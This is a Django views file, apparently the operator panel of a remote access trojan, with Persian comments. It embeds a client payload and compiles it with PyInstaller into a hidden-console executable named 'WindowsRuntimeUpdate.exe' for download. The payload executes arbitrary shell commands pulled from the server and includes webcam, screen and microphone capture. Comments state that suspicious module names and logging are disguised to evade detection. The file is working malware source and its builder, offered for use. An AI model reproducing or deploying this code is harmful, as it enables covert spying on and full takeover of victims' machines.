import os
import time
import subprocess
import shutil
import uuid
import logging
import psutil
import wave
import zipfile
from django.conf import settings
from django.http import FileResponse, HttpResponse
from django.shortcuts import render
from django.utils import timezone
from django.contrib.auth.decorators import login_required
from rest_framework.views import APIView
from rest_framework.response import Response
from rest_framework import status
from .models import Client
from .serializers import ClientSerializer
from datetime import timedelta

logger = logging.getLogger(__name__)

@login_required
def index(request):
    clients = Client.objects.all()
    online_count = clients.filter(last_seen__gte=timezone.now() - timedelta(seconds=30)).count()
    offline_count = clients.count() - online_count
    return render(request, 'index.html', {
        'clients': clients,
        'online_count': online_count,
        'offline_count': offline_count
    })

@login_required
def cmd_page(request, client_id):
    try:
        client = Client.objects.get(client_id=client_id)
        return render(request, 'cmd.html', {'client': client})
    except Client.DoesNotExist:
        logger.error(f"Client with ID {client_id} not found")
        return render(request, 'cmd.html', {'error': 'کلاینت یافت نشد'})

@login_required
def generate_exe(request):
    try:
        folder_path = os.path.join(settings.BASE_DIR, 'APP')
        os.makedirs(folder_path, exist_ok=True)

        client_code = """
import os
import getpass
import requests
import json
import uuid
import subprocess
import time
import logging
import re
import sys
import random
import wave

# تغییر نام ماژول‌های مشکوک
cv2 = __import__('cv2')
np = __import__('numpy')
pyaudio = __import__('pyaudio')
pyautogui = __import__('pyautogui')
base64 = __import__('base64')

# پیکربندی لاگینگ با نام غیرمشکوک
logger = logging.getLogger('SystemMonitor')
logging.basicConfig(
    level=logging.INFO,
    filename=f'{os.path.expanduser("~")}/.system_monitor.log',
    filemode='a',
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)

# اطلاعات اتصال به سرور با الگوی نام‌گذاری متفاوت
class ServerConfig:
    def __init__(self):
        self.API_ENDPOINT = "http://127.0.0.1:8000/api/"
        self.HEARTBEAT_INTERVAL = 30
        self.CHECK_INTERVAL = 60

config = ServerConfig()

class DeviceManager:
    def __init__(self):
        self.device_id = f"{getpass.getuser()}-{uuid.uuid4().hex[:8]}"
        self.current_path = os.getcwd()
        self.is_streaming = False
        self.stream_type = None

    def get_system_info(self):
        return {
            "user": getpass.getuser(),
            "os": os.name,
            "path": self.current_path,
            "platform": sys.platform
        }

    def execute_system_command(self, cmd):
        try:
            if cmd.lower().startswith('change_dir '):
                new_dir = cmd[11:].strip()
                os.chdir(new_dir)
                self.current_path = os.getcwd()
                return f"Directory changed to {self.current_path}"

            result = subprocess.run(
                cmd,
                shell=True,
                cwd=self.current_path,
                capture_output=True,
                text=True,
                encoding='utf-8'
            )
            return result.stdout or result.stderr or "Command executed"
        except Exception as e:
            return f"Error: {str(e)}"

    def capture_visual_data(self, source='screen'):
        try:
            if source == 'camera':
                cap = cv2.VideoCapture(0)
                ret, frame = cap.read()
                cap.release()
                if not ret:
                    return None
                frame = cv2.resize(frame, (640, 480))
            else:
                frame = np.array(pyautogui.screenshot())
                frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
                frame = cv2.resize(frame, (960, 540))

            _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 30])
            return base64.b64encode(buffer).decode('ascii')
        except Exception:
            return None

    def record_audio_sample(self, duration=1):
        try:
            audio = pyaudio.PyAudio()
            stream = audio.open(
                format=pyaudio.paInt16,
                channels=1,
                rate=22050,
                input=True,
                frames_per_buffer=1024
            )
            frames = [stream.read(1024) for _ in range(int(22050/1024*duration))]
            stream.stop_stream()
            stream.close()
            audio.terminate()

            with wave.open('temp.wav', 'wb') as wf:
                wf.setnchannels(1)
                wf.setsampwidth(audio.get_sample_size(pyaudio.paInt16))
                wf.setframerate(22050)
                wf.writeframes(b''.join(frames))

            with open('temp.wav', 'rb') as f:
                return base64.b64encode(f.read()).decode('ascii')
        except Exception:
            return None

class DataService:
    def __init__(self, device_manager):
        self.device = device_manager
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Content-Type': 'application/json'
        })

    def send_heartbeat(self):
        data = {
            "device_id": self.device.device_id,
            "status": "active",
            "info": self.device.get_system_info()
        }
        try:
            response = self.session.post(
                f"{config.API_ENDPOINT}/poll/{self.device.device_id}/",
                json=data,
                timeout=10
            )
            return response.json()
        except Exception:
            return None

    def check_for_commands(self):
        try:
            response = self.session.get(
                f"{config.API_ENDPOINT}/command/{self.device.device_id}/",
                timeout=10
            )
            return response.json()
        except Exception:
            return None

    def send_command_result(self, command_id, result):
        try:
            response = self.session.post(
                f"{config.API_ENDPOINT}/poll/{self.device.device_id}/",
                json={
                    "device_id": self.device.device_id,
                    "command_id": command_id,
                    "result": result
                },
                timeout=10
            )
            return response.status_code == 200
        except Exception:
            return False

def main():
    manager = DeviceManager()
    service = DataService(manager)

    service.send_heartbeat()

    while True:
        try:
            if random.random() < 0.7:
                service.send_heartbeat()

            commands = service.check_for_commands()
            if commands and isinstance(commands, list):
                for cmd in commands:
                    result = manager.execute_system_command(cmd.get('text', ''))
                    if cmd.get('id'):
                        service.send_command_result(cmd['id'], result)

            time.sleep(random.randint(30, 90))

        except Exception as e:
            logger.error(f"Error in main loop: {str(e)}")
            time.sleep(300)

if __name__ == "__main__":
    print("Initializing system monitor...")
    time.sleep(random.randint(5, 15))
    main()
"""
        client_path = os.path.join(folder_path, 'client.py')
        with open(client_path, 'w', encoding='utf-8') as f:
            f.write(client_code)

        exe_path = os.path.join(folder_path, 'WindowsRuntimeUpdate.exe')
        zip_path = os.path.join(folder_path, 'WindowsRuntimeUpdate.zip')
        icon_path = os.path.join(settings.BASE_DIR, 'icon.ico')

        # بررسی و بستن پروسه‌های در حال اجرا
        for proc in psutil.process_iter(['name']):
            if proc.info['name'].lower() == 'windowsruntimeupdate.exe':
                try:
                    proc.terminate()
                    proc.wait(timeout=5)
                    logger.info("Terminated existing WindowsRuntimeUpdate.exe process")
                except psutil.Error as e:
                    logger.warning(f"Failed to terminate process: {str(e)}")

        # حذف فایل‌های قدیمی
        for file_path in [exe_path, zip_path, os.path.join(folder_path, 'client.spec')]:
            if os.path.exists(file_path):
                for _ in range(5):
                    try:
                        os.chmod(file_path, 0o666)
                        os.remove(file_path)
                        logger.info(f"Removed old file: {file_path}")
                        break
                    except PermissionError:
                        time.sleep(2)
                else:
                    raise PermissionError(f"نمی‌توان فایل {file_path} را حذف کرد، احتمالاً در حال اجرا است.")

        # اجرای PyInstaller برای ساخت فایل اجرایی
        for attempt in range(3):
            try:
                pyinstaller_cmd = [
                    'pyinstaller',
                    '--onefile',
                    '--noconsole',
                    '--distpath', folder_path,
                    '--specpath', folder_path,
                    '--name', 'WindowsRuntimeUpdate'
                ]
                if os.path.exists(icon_path):
                    pyinstaller_cmd.append(f'--icon={icon_path}')
                else:
                    logger.warning(f"Icon file not found at {icon_path}, proceeding without icon")
                pyinstaller_cmd.append(client_path)
                
                logger.info(f"Running PyInstaller with command: {' '.join(pyinstaller_cmd)}")
                result = subprocess.run(pyinstaller_cmd, check=True, timeout=300, capture_output=True, text=True)
                logger.info(f"PyInstaller output: {result.stdout}")
                logger.info(f"PyInstaller stderr: {result.stderr}")
                break
            except (subprocess.CalledProcessError, subprocess.TimeoutExpired) as e:
                error_message = f"PyInstaller attempt {attempt + 1} failed: {str(e)}"
                if e.stderr:
                    error_message += f"\nStderr: {e.stderr}"
                logger.error(error_message)
                if attempt < 2:
                    time.sleep(5)
                    continue
                raise Exception(f"خطا در ساخت فایل WindowsRuntimeUpdate.exe: {error_message}")

        # بررسی وجود فایل اجرایی
        if not os.path.exists(exe_path):
            raise FileNotFoundError(f"فایل اجرایی {exe_path} پس از اجرای PyInstaller یافت نشد.")

        # تولید فایل زیپ
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(exe_path, 'WindowsRuntimeUpdate.exe')
            logger.info(f"Created zip file: {zip_path}")

        # پاکسازی فایل‌های موقت
        for file_path in [client_path, os.path.join(folder_path, 'client.spec'), exe_path]:
            if os.path.exists(file_path):
                try:
                    os.remove(file_path)
                    logger.info(f"Removed temporary file: {file_path}")
                except Exception as e:
                    logger.warning(f"Failed to remove temporary file {file_path}: {str(e)}")

        shutil.rmtree(os.path.join(folder_path, 'build'), ignore_errors=True)
        logger.info("Cleaned up build directory")

        return render(request, 'index.html', {
            'clients': Client.objects.all(),
            'online_count': Client.objects.filter(last_seen__gte=timezone.now() - timedelta(seconds=30)).count(),
            'offline_count': Client.objects.count() - Client.objects.filter(last_seen__gte=timezone.now() - timedelta(seconds=30)).count(),
            'message': 'فایل WindowsRuntimeUpdate.zip با موفقیت در پوشه APP ساخته شد!'
        })
    except Exception as e:
        logger.error(f"خطا در ساخت فایل: {str(e)}")
        return render(request, 'index.html', {
            'clients': Client.objects.all(),
            'online_count': Client.objects.filter(last_seen__gte=timezone.now() - timedelta(seconds=30)).count(),
            'offline_count': Client.objects.count() - Client.objects.filter(last_seen__gte=timezone.now() - timedelta(seconds=30)).count(),
            'message': f'خطا در ساخت WindowsRuntimeUpdate.zip: {str(e)}'
        })

@login_required
def download_device(request):
    """
    View for downloading WindowsRuntimeUpdate.zip from APP folder with proper headers.
    """
    zip_path = os.path.join(settings.BASE_DIR, 'APP', 'WindowsRuntimeUpdate.zip')
    if os.path.exists(zip_path):
        try:
            response = FileResponse(
                open(zip_path, 'rb'),
                as_attachment=True,
                filename='WindowsRuntimeUpdate.zip'
            )
            response['Content-Type'] = 'application/zip'
            response['Content-Disposition'] = f'attachment; filename="WindowsRuntimeUpdate.zip"'
            response['Content-Length'] = os.path.getsize(zip_path)
            logger.info("WindowsRuntimeUpdate.zip downloaded successfully")
            return response
        except IOError as e:
            logger.error(f"Error reading file {zip_path}: {str(e)}")
            return render(request, 'index.html', {
                'clients': Client.objects.all(),
                'online_count': Client.objects.filter(last_seen__gte=timezone.now() - timedelta(seconds=30)).count(),
                'offline_count': Client.objects.count() - Client.objects.filter(last_seen__gte=timezone.now() - timedelta(seconds=30)).count(),
                'message': 'خطا در خواندن فایل WindowsRuntimeUpdate.zip.'
            })
    else:
        logger.error(f"WindowsRuntimeUpdate.zip not found at {zip_path}")
        return render(request, 'index.html', {
            'clients': Client.objects.all(),
            'online_count': Client.objects.filter(last_seen__gte=timezone.now() - timedelta(seconds=30)).count(),
            'offline_count': Client.objects.count() - Client.objects.filter(last_seen__gte=timezone.now() - timedelta(seconds=30)).count(),
            'message': 'خطا: فایل WindowsRuntimeUpdate.zip یافت نشد. لطفاً ابتدا فایل را بسازید.'
        })

class ClientRegisterView(APIView):
    def post(self, request):
        client_id = request.data.get('client_id')
        token = request.data.get('token')
        if not client_id or not token:
            logger.error("Missing client_id or token")
            return Response({'error': 'client_id and token required'}, status=status.HTTP_400_BAD_REQUEST)
        client, created = Client.objects.get_or_create(
            client_id=client_id,
            defaults={'token': token, 'last_seen': timezone.now()}
        )
        client.last_seen = timezone.now()
        client.save()
        serializer = ClientSerializer(client)
        logger.info(f"Client {client_id} {'registered' if created else 'updated'}")
        return Response(serializer.data, status=status.HTTP_201_CREATED if created else status.HTTP_200_OK)

class ClientCommandView(APIView):
    def post(self, request, client_id):
        try:
            client = Client.objects.get(client_id=client_id)
            command = request.data.get('command')
            if not command:
                logger.error(f"No command provided for client {client_id}")
                return Response({'error': 'command required'}, status=status.HTTP_400_BAD_REQUEST)
            client.last_command = command
            client.command_id = uuid.uuid4()
            client.last_seen = timezone.now()
            client.save()
            output = client.last_output or ''
            if command.lower() in ['webcam', 'weblive', 'webmicrophone']:
                output = 'Stream started'
            return Response({
                'status': 'command sent',
                'command_id': str(client.command_id),
                'output': output
            }, status=status.HTTP_200_OK)
        except Client.DoesNotExist:
            logger.error(f"Client {client_id} not found")
            return Response({'error': 'client not found'}, status=status.HTTP_404_NOT_FOUND)

class ClientPollView(APIView):
    def get(self, request, client_id):
        try:
            client = Client.objects.get(client_id=client_id)
            client.last_seen = timezone.now()
            client.save()
            serializer = ClientSerializer(client)
            logger.info(f"Poll request from {client_id}")
            return Response(serializer.data, status=status.HTTP_200_OK)
        except Client.DoesNotExist:
            logger.error(f"Client {client_id} not found")
            return Response({'error': 'client not found'}, status=status.HTTP_404_NOT_FOUND)

    def post(self, request, client_id):
        try:
            client = Client.objects.get(client_id=client_id)
            output = request.data.get('output')
            if output:
                client.last_output = output
                client.last_command = None
                client.command_id = None
                client.last_seen = timezone.now()
                client.save()
                logger.info(f"Output received from {client_id}: {output[:100]}...")
            return Response({'status': 'output received'}, status=status.HTTP_202_ACCEPTED)
        except Client.DoesNotExist:
            logger.error(f"Client {client_id} not found")
            return Response({'error': 'client not found'}, status=status.HTTP_404_NOT_FOUND)

class StreamView(APIView):
    def post(self, request, client_id, stream_type):
        try:
            client = Client.objects.get(client_id=client_id)
            data = request.data.get('data')
            if data:
                client.last_output = data
                client.last_seen = timezone.now()
                client.save()
                logger.info(f"Stream data received from {client_id} for {stream_type}")
            return Response({'status': 'data received'}, status=status.HTTP_202_ACCEPTED)
        except Client.DoesNotExist:
            logger.error(f"Client {client_id} not found")
            return Response({'error': 'client not found'}, status=status.HTTP_404_NOT_FOUND)

    def get(self, request, client_id, stream_type):
        try:
            client = Client.objects.get(client_id=client_id)
            data = client.last_output
            if data and not data.startswith('Error'):
                return Response({'data': data}, status=status.HTTP_200_OK)
            else:
                logger.warning(f"No valid stream data for {client_id} ({stream_type})")
                return Response({'data': data or 'No data available'}, status=status.HTTP_200_OK)
        except Client.DoesNotExist:
            logger.error(f"Client {client_id} not found")
            return Response({'error': 'client not found'}, status=status.HTTP_404_NOT_FOUND)